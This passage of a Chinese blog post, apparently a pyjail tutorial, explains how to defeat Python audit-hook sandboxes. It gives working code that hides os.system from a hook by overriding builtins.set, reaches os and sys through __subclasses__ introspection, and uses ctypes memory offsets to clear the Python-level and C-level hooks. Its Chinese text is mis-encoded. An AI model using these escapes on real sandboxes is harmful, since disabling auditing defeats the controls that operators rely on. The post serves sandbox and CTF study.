<span class="keyword">not</span> <span class="keyword">in</span> WHITED_EVENTS:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[HOOK] Operation not permitted: <span class="subst">&#123;event&#125;</span>&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[HOOK] Allowed: <span class="subst">&#123;event&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys.addaudithook(my_audit_hook)</span><br><span class="line"></span><br><span class="line">__builtins__.<span class="built_in">set</span> = <span class="keyword">lambda</span> x: [<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç°åœ¨è§¦å‘ os.system äº‹ä»¶</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&quot;echo PWNED&quot;</span>)  <span class="comment"># âœ… è¢«æ”¾è¡Œ</span></span><br></pre></td></tr></table></figure></div>

<h3 id="å†…çœæœºåˆ¶æŸ¥è¯¢æ¨¡å—"><a href="#å†…çœæœºåˆ¶æŸ¥è¯¢æ¨¡å—" class="headerlink" title="å†…çœæœºåˆ¶æŸ¥è¯¢æ¨¡å—"></a>å†…çœæœºåˆ¶æŸ¥è¯¢æ¨¡å—</h3><p>é€šè¿‡<strong>å†…çœæœºåˆ¶</strong>æŸ¥è¯¢æ¨¡å—å¯ä»¥<strong>ä¸èµ° <code>import</code> è·¯å¾„ä¹Ÿèƒ½æ‹¿åˆ°æ¨¡å—å¯¹è±¡</strong>ï¼Œä»è€Œ<strong>ç»•å¼€åªæ‹¦ <code>import</code> çš„ audit hook</strong>ã€‚è¿™æ˜¯å› ä¸ºè§£é‡Šå™¨å¯åŠ¨åï¼Œ<strong>å¾ˆå¤šæ¨¡å—å·²ç»åŠ è½½</strong>ï¼ˆæ¯”å¦‚ <code>sys</code>ã€<code>os</code>ã€<code>_sitebuiltins</code> ç­‰ï¼‰ï¼Œå¹¶ä¸”è¢«<strong>å„ç§å¯¹è±¡å¼•ç”¨ç€</strong>ï¼ˆå‡½æ•°çš„ <code>__globals__</code>ã€æ¨¡å—çš„å±æ€§ã€ç±»æ–¹æ³•é—­åŒ…ç­‰ï¼‰ã€‚åªè¦ä½ èƒ½æ‰¾åˆ°<strong>ä»»ä½•</strong>ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒçš„ <code>__globals__</code> é‡Œ<strong>æ°å¥½åŒ…å«</strong>ä½ è¦çš„æ¨¡å—å¼•ç”¨ï¼Œå°±èƒ½<strong>ç›´æ¥å–å‡ºæ¥</strong>ï¼Œå®Œå…¨<strong>ä¸è§¦å‘ <code>import</code> äº‹ä»¶</strong>ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è·å– sys</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å– os</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;_sitebuiltins.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) <span class="keyword">and</span> <span class="keyword">not</span> <span class="string">&quot;_Helper&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…¶ä»–çš„ payload ä¹Ÿéƒ½ä¸ä¼šè§¦å‘</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>ç„¶è€Œç”±äº Python åŠ è½½çš„æ¨¡å—æ˜¯å•ä¾‹æ¨¡å¼ï¼Œå› æ­¤å¦‚æœæŠŠ <code>os</code> ä» <strong><code>sys.modules</code> ç¼“å­˜</strong>é‡Œåˆ æ‰äº†ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> <span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;os&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<p>è€Œå†…çœæœºåˆ¶åªæ˜¯å¯»æ‰¾å·²åŠ è½½çš„æ¨¡å—ï¼Œä¸ä¼šä¸»åŠ¨åŠ è½½æ¨¡å—ï¼Œå› æ­¤ä¼šå‡ºç°æ‰¾ä¸åˆ°æ¨¡å—çš„æƒ…å†µã€‚</p>
<h2 id="ç»•è¿‡åŸºäº-CPython-çš„-audit-hook"><a href="#ç»•è¿‡åŸºäº-CPython-çš„-audit-hook" class="headerlink" title="ç»•è¿‡åŸºäº CPython çš„ audit hook"></a>ç»•è¿‡åŸºäº CPython çš„ audit hook</h2><p>audit hook ä¸ä»…å¯ä»¥åœ¨ python å±‚é¢è¿›è¡Œå®šä¹‰ï¼Œè¿˜å¯ä»¥åœ¨ CPython ä¸­è¿›è¡Œç¼–å†™ã€‚</p>
<ul>
<li><strong>C çº§ï¼ˆè¿›ç¨‹çº§ï¼‰</strong>ï¼šç”¨ <code>PySys_AddAuditHook</code> æ³¨å†Œï¼ŒæŒ‚åœ¨ <strong>_PyRuntimeState</strong> é‡Œï¼ˆå…¨å±€è¿è¡Œæ—¶ï¼‰ã€‚å½±å“<strong>æ‰€æœ‰è§£é‡Šå™¨</strong>ã€‚</li>
<li><strong>Python çº§ï¼ˆè§£é‡Šå™¨çº§ï¼‰</strong>ï¼šç”¨ <code>sys.addaudithook</code> æ³¨å†Œï¼ŒæŒ‚åœ¨ <strong>PyInterpreterState</strong> é‡Œï¼ˆå½“å‰è§£é‡Šå™¨ï¼‰ã€‚åªå½±å“<strong>å½“å‰è§£é‡Šå™¨</strong>ã€‚</li>
</ul>
<p>äº‹ä»¶è§¦å‘é¡ºåºä¸€èˆ¬æ˜¯ï¼š<strong>å…ˆ C çº§</strong> â†’ <strong>å† Python çº§</strong>ã€‚</p>
<p>å¦‚æœä½¿ç”¨ CPython æ¥å®šä¹‰ audit hookï¼Œè‡³å°‘åœ¨ python å±‚é¢å°±æ²¡æ³•è¦†ç›–å‡½æ•°ã€‚</p>
<p>é¡¹ç›® <a class="link"   target="_blank" rel="noopener" href="https://github.com/Nambers/python-audit_hook_head_finder" >Nambers&#x2F;python-audit_hook_head_finder: PWNable pyjail<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ç»™å‡ºäº†å‡ ç§é€šè¿‡ä¿®æ”¹ python å†…å­˜æ¥ç¯¡æ”¹è¯¥ audit hook çš„æ–¹å¼ã€‚</p>
<h3 id="åˆ©ç”¨-ctypes-è¦†ç›–-audit-hook"><a href="#åˆ©ç”¨-ctypes-è¦†ç›–-audit-hook" class="headerlink" title="åˆ©ç”¨ ctypes è¦†ç›– audit hook"></a>åˆ©ç”¨ ctypes è¦†ç›– audit hook</h3><h4 id="audit-hook-ç»“æ„"><a href="#audit-hook-ç»“æ„" class="headerlink" title="audit hook ç»“æ„"></a>audit hook ç»“æ„</h4><h5 id="PyRuntimeState"><a href="#PyRuntimeState" class="headerlink" title="_PyRuntimeState"></a>_PyRuntimeState</h5><p><a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/3966d8d626fc9adcdf0663024d4ae6e6be7ef858/Include/internal/pycore_runtime.h#L199"><code>_PyRuntimeState</code> ç»“æ„ä½“</a>ä¸­å­˜å‚¨äº† audit hook åˆ—è¡¨ <code>audit_hooks</code>ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pyruntimestate</span> &#123;</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pyinterpreters</span> &#123;</span></span><br><span class="line">        PyThread_type_lock mutex;</span><br><span class="line">        PyInterpreterState *head;</span><br><span class="line">        PyInterpreterState *main;</span><br><span class="line">        <span class="type">int64_t</span> next_id;</span><br><span class="line">    &#125; interpreters;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        PyMutex mutex;</span><br><span class="line">        _Py_AuditHookEntry *head;</span><br><span class="line">    &#125; audit_hooks;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    PyInterpreterState _main_interpreter;</span><br><span class="line"></span><br><span class="line">&#125; _PyRuntimeState;</span><br></pre></td></tr></table></figure></div>

<p><code>_Py_AuditHookEntry</code> æ˜¯ä¸€ä¸ª audit hook é“¾è¡¨ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">Py_AuditHookEntry</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">Py_AuditHookEntry</span> *<span class="title">next</span>;</span></span><br><span class="line">    Py_AuditHookFunction hookCFunction;</span><br><span class="line">    <span class="type">void</span> *userData;</span><br><span class="line">&#125; _Py_AuditHookEntry;</span><br></pre></td></tr></table></figure></div>

<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œpython3.11 ä¸ python3.12 ä¸åŒï¼Œä»…ä½¿ç”¨ <code>audit_hook_head</code> æŒ‡é’ˆè¿›è¡Œå­˜æ”¾ã€‚<code>_Py_AuditHookEntry</code> æ²¡æœ‰å˜åŒ–ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pyruntimestate</span> &#123;</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    _Py_AuditHookEntry *audit_hook_head;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125; _PyRuntimeState;</span><br></pre></td></tr></table></figure></div>

<p><code>_PyRuntimeState</code> ä¸­å­˜å‚¨çš„ audit hookï¼Œå¯¹åº”çš„å°±æ˜¯ CPython ä¸­é€šè¿‡ <code>PySys_AddAuditHook</code> æ·»åŠ çš„å®¡è®¡é’©å­ã€‚<code>PySys_AddAuditHook</code> ç”¨äºåœ¨ Python è¿è¡Œæ—¶ä¸­æ·»åŠ å…¨å±€å®¡è®¡é’©å­, é€šè¿‡è¯¥å‡½æ•°æ·»åŠ çš„å®¡è®¡é’©å­ä¼šå½±å“æ•´ä¸ª Python è¿è¡Œæ—¶ä¸­çš„æ‰€æœ‰è§£é‡Šå™¨ï¼Œæ— è®ºæ˜¯ä¸»è§£é‡Šå™¨è¿˜æ˜¯å­è§£é‡Šå™¨ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">audit</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *event, PyObject *args, <span class="type">void</span> *userData)</span> &#123;</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> running = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (running) &#123;</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!running &amp;&amp; !<span class="built_in">strcmp</span>(event, <span class="string">&quot;exec&quot;</span>)) running = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> PyObject* <span class="title function_">irs_audit</span><span class="params">(PyObject *self, PyObject *args)</span> &#123;</span><br><span class="line">	PySys_AddAuditHook(audit, <span class="literal">NULL</span>);</span><br><span class="line">	Py_RETURN_NONE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="PyInterpreterState"><a href="#PyInterpreterState" class="headerlink" title="PyInterpreterState"></a>PyInterpreterState</h5><p><a target="_blank" rel="noopener" href="https://github.com/python/cpython/blob/3966d8d626fc9adcdf0663024d4ae6e6be7ef858/Include/internal/pycore_interp.h#L96"><code>PyInterpreterState</code></a> ä¹ŸåŒæ ·å­˜å‚¨äº† audit hookï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">is</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    PyObject *audit_hooks;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä½†è¿™ä¸ª <code>audit_hooks</code> å®é™…ä¸Šæ˜¯ä¸€ä¸ª <code>PyObject</code> æŒ‡é’ˆï¼Œå¯¹åº”çš„æ˜¯ Python å±‚é¢çš„ audit hookï¼Œä¹Ÿå°±æ˜¯é€šè¿‡ <code>sys.addaudithook()</code> æ·»åŠ çš„å®¡è®¡é’©å­ã€‚é€šè¿‡è¯¥å‡½æ•°æ·»åŠ çš„å®¡è®¡é’©å­åªä¼šå½±å“å½“å‰è§£é‡Šå™¨ï¼ˆä¸»è§£é‡Šå™¨æˆ–æŸä¸ªå­è§£é‡Šå™¨ï¼‰ï¼Œä¸ä¼šå½±å“å…¶ä»–è§£é‡Šå™¨ã€‚</p>
<h4 id="è·å–-audit-hook-å‡½æ•°åœ°å€"><a href="#è·å–-audit-hook-å‡½æ•°åœ°å€" class="headerlink" title="è·å– audit hook å‡½æ•°åœ°å€"></a>è·å– audit hook å‡½æ•°åœ°å€</h4><p>åœ¨ CPython ä¸­ï¼ŒæŸäº›å¸¸ç”¨çš„ä¸å¯å˜å¯¹è±¡ï¼ˆå¦‚ç©ºå…ƒç»„ã€ç©ºå­—ç¬¦ä¸²ç­‰ï¼‰æ˜¯å•ä¾‹å¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡åœ¨è§£é‡Šå™¨å¯åŠ¨æ—¶å°±è¢«åˆ›å»ºå¹¶ç¼“å­˜èµ·æ¥ï¼Œå› æ­¤å…¶å†…å­˜åœ°å€æ˜¯å›ºå®šä¸å˜çš„ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªæµ‹è¯•ä»£ç ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">id</span>(())))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">id</span>(())))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">id</span>(<span class="string">&#x27;&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">id</span>(<span class="string">&#x27;&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">id</span>(&#123;&#125;)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">id</span>(&#123;&#125;)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">id</span>([])))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">id</span>([])))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xb56d58</span></span><br><span class="line"><span class="comment"># 0xb56d58</span></span><br><span class="line"><span class="comment"># 0xb4a370</span></span><br><span class="line"><span class="comment"># 0xb4a370</span></span><br><span class="line"><span class="comment"># 0x7fb20e2c6640</span></span><br><span class="line"><span class="comment"># 0x7fb20e2c6640</span></span><br><span class="line"><span class="comment"># 0x7fb20e7ccb40</span></span><br><span class="line"><span class="comment"># 0x7fb20e7ccb40</span></span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çœ‹åˆ°ç©ºå…ƒç»„å’Œç©ºå­—ç¬¦ä¸²çš„åœ°å€éƒ½æ²¡æœ‰å˜åŒ–ã€‚è€Œç©ºåˆ—è¡¨å’Œç©ºå­—å…¸æ¯æ¬¡æ‰§è¡Œæ—¶åœ°å€ä¼šå‘ç”Ÿå˜åŒ–ï¼Œä½†åœ¨åŒä¸€ä¸ªè„šæœ¬ä¸­å¤šæ¬¡æ‰§è¡Œçš„ç»“æœéƒ½æ˜¯ä¸å˜çš„ã€‚</p>
<p>åœ¨ç›¸åŒç‰ˆæœ¬çš„ Python ä¸­ï¼Œæ•°æ®ç»“æ„ï¼ˆå¦‚ <code>PyInterpreterState</code> å’Œ <code>_PyRuntimeState</code>ï¼‰çš„å¤§å°å’Œå­—æ®µä½ç½®é€šå¸¸åœ¨ç¼–è¯‘æ—¶å°±ç¡®å®šäº†å¤§å°å’Œå¸ƒå±€ã€‚å› æ­¤ä»æŸä¸ªå¯¹è±¡ï¼ˆå¦‚ç©ºå…ƒç»„ï¼‰çš„åœ°å€åˆ°å®¡è®¡é’©å­åˆ—è¡¨æŒ‡é’ˆçš„ä½ç½®é€šå¸¸æ˜¯ä¸€ä¸ªå¸¸æ•°ã€‚</p>
<p>ä¾æ®è¿™ä¸ªåŸç†ï¼Œé¡¹ç›® <a class="link"   target="_blank" rel="noopener" href="https://github.com/Nambers/python-audit_hook_head_finder" >Nambers&#x2F;python-audit_hook_head_finder: PWNable pyjail<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> é€šè¿‡åœ¨ C å±‚é¢æ‰“å°å‡º <code>_PyRuntimeState.audit_hooks.head</code> å’Œ <code>PyInterpreterState.audit_hooks</code> çš„åœ°å€ï¼Œç„¶åè®¡ç®—ä¸ç©ºå…ƒç»„åœ°å€çš„åç§»ï¼Œå¾—åˆ°äº†è¿™ä¸ªåç§»å¸¸é‡ã€‚</p>
<ol>
<li><p>è·å– <code>_PyRuntimeState.audit_hooks.head</code> å’Œ <code>PyInterpreterState.audit_hooks</code> çš„åœ°å€</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®ï¼šè·å–è¿è¡Œæ—¶ï¼ˆRuntimeStateï¼‰çš„åŸºåœ°å€</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_RUNTIME_ADDR() &amp;_PyRuntime</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ï¼šè·å–å½“å‰è§£é‡Šå™¨ï¼ˆInterpreterStateï¼‰çš„æŒ‡é’ˆ</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_INTERP_ADDR() _PyRuntime.interpreters.head</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ï¼šè·å–å½“å‰è§£é‡Šå™¨ audit_hooks å­—æ®µçš„åœ°å€ï¼ˆPython çº§ hook åˆ—è¡¨ï¼‰</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_INTERP_AUDIT_HOOK_PTR_ADDR() &amp;GET_INTERP_ADDR()-&gt;audit_hooks</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ï¼šè·å–è¿è¡Œæ—¶ audit_hooks é“¾è¡¨å¤´æŒ‡é’ˆçš„åœ°å€ï¼ˆC çº§å…¨å±€ hook åˆ—è¡¨ï¼‰</span></span><br><span class="line"><span class="comment">// Python 3.12+ ç»“æ„ä½“ä¸åŒï¼ˆå¸¦ head å­—æ®µï¼‰ï¼Œ&lt;=3.11 æ˜¯å•æŒ‡é’ˆ audit_hook_head</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> PY_MINOR_VERSION &gt;= 12</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> GET_RUNTIME_AUDIT_HOOK_PTR_ADDR() &amp;_PyRuntime.audit_hooks.head</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> GET_RUNTIME_AUDIT_HOOK_PTR_ADDR() &amp;_PyRuntime.audit_hook_head</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>è·å–åç§»å€¼</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ„é€ ä¸€ä¸ª PyObject çš„å¼•ç”¨å¯¹è±¡ï¼ˆbyref è¿”å›çš„æ˜¯æŒ‡é’ˆï¼‰</span></span><br><span class="line">obj = ctypes.byref(ctypes.py_object(()))</span><br><span class="line">ptr_tp = ctypes.POINTER(ctypes.c_uint64)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å– obj åœ¨å†…å­˜ä¸­çš„åœ°å€</span></span><br><span class="line">obj_addr = ctypes.cast(obj, ptr_tp).contents.value</span><br><span class="line"></span><br><span class="line"><span class="comment"># éªŒè¯å¦ä¸€ç§æ–¹å¼è·å– obj_addrï¼ˆç›´æ¥å–ç©º tuple å¯¹è±¡æŒ‡é’ˆï¼‰</span></span><br><span class="line"><span class="keyword">assert</span> ctypes.POINTER(ctypes.c_voidp)(ctypes.py_object(())).contents.value == obj_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¹æ®å½“å‰å¯¹è±¡åœ°å€ï¼Œè®¡ç®— Python çº§ audit_hooks æŒ‡é’ˆçš„åç§»</span></span><br><span class="line">audit_hook_ptr_offset_by_py = get_interp_audit_hook_ptr_addr() - obj_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¹æ®å½“å‰å¯¹è±¡åœ°å€ï¼Œè®¡ç®— C çº§ï¼ˆruntimeï¼‰ audit_hooks æŒ‡é’ˆçš„åç§»</span></span><br><span class="line">audit_hook_ptr_offset_by_c = get_runtime_audit_hook_ptr_addr() - obj_addr</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;audit_hook_ptr_offset_by_py=<span class="subst">&#123;<span class="built_in">hex</span>(audit_hook_ptr_offset_by_py)&#125;</span>\n&quot;</span></span><br><span class="line">      <span class="string">f&quot;audit_hook_ptr_offset_by_c=<span class="subst">&#123;<span class="built_in">hex</span>(audit_hook_ptr_offset_by_c)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div></li>
</ol>
<h4 id="è¦†ç›–-audit-hook"><a href="#è¦†ç›–-audit-hook" class="headerlink" title="è¦†ç›– audit hook"></a>è¦†ç›– audit hook</h4><p>å› è€Œåœ¨é’ˆå¯¹è¯¥ç‰ˆæœ¬ Python è¿›è¡Œåˆ©ç”¨æ—¶ï¼Œåªéœ€è¦é€šè¿‡ç©ºå…ƒç»„çš„åœ°å€ï¼Œå†åŠ ä¸Šè¿™ä¸ªåç§»å€¼ï¼Œå°±èƒ½å¤Ÿæ‰¾åˆ° audit hook çš„åœ°å€ã€‚åˆ©ç”¨éƒ¨åˆ†å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">audit_hook_by_py: <span class="built_in">list</span> = ctypes.cast(ctypes.cast(obj_addr + audit_hook_ptr_offset_by_py, ptr_tp).contents.value, ctypes.py_object).value</span><br><span class="line"><span class="comment"># and as C array ig</span></span><br><span class="line">audit_hook_by_c: <span class="built_in">list</span> = ctypes.cast(obj_addr + audit_hook_ptr_offset_by_c, ptr_tp)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;len=<span class="subst">&#123;<span class="built_in">len</span>(audit_hook_by_py)&#125;</span> should be 1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># - POC - </span></span><br><span class="line"></span><br><span class="line">ctypes._os.system(<span class="string">&quot;echo &#x27;test audit hook -- this will trigger hook&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">audit_hook_by_py.pop()</span><br><span class="line">ctypes.memset(audit_hook_by_c, <span class="number">0</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">ctypes._os.system(<span class="string">&quot;echo &#x27;test audit hook -- this will not&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<ol>
<li>python å±‚é¢çš„ audit hook å¯ä»¥é€šè¿‡ <code>ctypes.cast</code> å°† <code>PyInterpreterState.audit_hooks</code> åœ°å€å¤„çš„ <code>.contents.value</code> è½¬æ¢ä¸ºä¸€ä¸ª python åŸç”Ÿç±»å‹ï¼ˆ<code>py_object</code>ï¼‰ï¼Œæœ€ç»ˆå¾—åˆ°ä¸€ä¸ª <code>list</code> ï¼Œåˆ©ç”¨ <code>pop</code> å‡½æ•°å°†å…¶å¼¹å‡ºå³å¯</li>
<li>c å±‚é¢çš„ audit hook è™½ç„¶ä¿å­˜åœ¨ <code>list</code> é‡Œï¼Œç„¶è€Œå®é™…ä¸Šåªé€šè¿‡ <code>ctypes.cast</code> å°†å…¶è½¬æ¢ä¸ºäº†ä¸€ä¸ªæŒ‡é’ˆ 64 ä½æŒ‡é’ˆï¼š <code>&lt;class &#39;__main__.LP_c_ulong&#39;&gt;</code>ï¼ŒæŒ‡å‘äº† hook å‡½æ•°çš„åœ°å€ã€‚é€šè¿‡ <code>memset</code> å°†åœ°å€æ¸…ç©ºç½®ç©ºåˆ™è¾¾åˆ°äº†æ¸…é™¤ audit hook çš„ç›®çš„ã€‚</li>
</ol>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Python æ²™ç®±é€ƒé€¸</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2025-08-12 00:01:08</li>
        
